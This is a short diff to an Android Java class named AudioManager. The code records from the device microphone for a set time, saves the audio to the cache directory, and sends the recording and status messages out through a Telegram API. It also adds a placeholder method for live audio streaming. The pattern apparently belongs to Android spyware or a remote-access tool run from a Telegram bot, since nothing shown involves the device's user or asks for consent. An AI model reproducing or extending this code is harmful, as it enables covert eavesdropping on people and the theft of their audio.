@@ -15,24 +15,23 @@ public class AudioManager {
 
     public void recordAudio(int seconds) {
         try {
-            File audioFile = new File(context.getCacheDir(), "rec.mp3");
+            File out = new File(context.getCacheDir(), "rec.mp3");
             recorder = new MediaRecorder();
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            recorder.setOutputFile(audioFile.getAbsolutePath());
+            recorder.setOutputFile(out.getAbsolutePath());
             recorder.prepare();
             recorder.start();
-
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    recorder.stop();
-                    recorder.release();
-                    TelegramApi.sendFile(audioFile, "🎙 Audio Record (" + seconds + "s)");
-                } catch (Exception e) {}
-            }, seconds * 1000);
-        } catch (Exception e) {
-            TelegramApi.sendMessage("❌ Audio Error: " + e.getMessage());
-        }
+                try { recorder.stop(); recorder.release(); TelegramApi.sendFile(out, "🎙 Audio " + seconds + "s"); }
+                catch (Exception e) { TelegramApi.sendMessage("❌ Audio error"); }
+            }, seconds * 1000L);
+            TelegramApi.sendMessage("🎙 Recording " + seconds + "s...");
+        } catch (Exception e) { TelegramApi.sendMessage("❌ Audio error: " + e.getMessage()); }
+    }
+
+    public void startLiveStream() {
+        TelegramApi.sendMessage("🔴 Live audio stream started (placeholder)");
     }
 }
